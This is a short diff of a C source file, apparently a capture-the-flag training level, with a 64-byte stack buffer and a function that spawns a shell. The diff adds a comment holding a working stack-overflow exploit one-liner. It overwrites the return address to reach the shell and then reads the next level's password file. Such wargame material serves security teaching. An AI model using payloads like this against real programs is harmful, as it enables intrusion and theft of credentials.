@@ -7,6 +7,7 @@ void run(void)
     system("/bin/sh");
 }
 
+// (python -c "print 'A'*76 + '\x44\x84\x04\x08'"; echo "cat /home/user/level2/.pass"; sleep 1) | ./level1
 int main(void)
 {
     char buf[64];
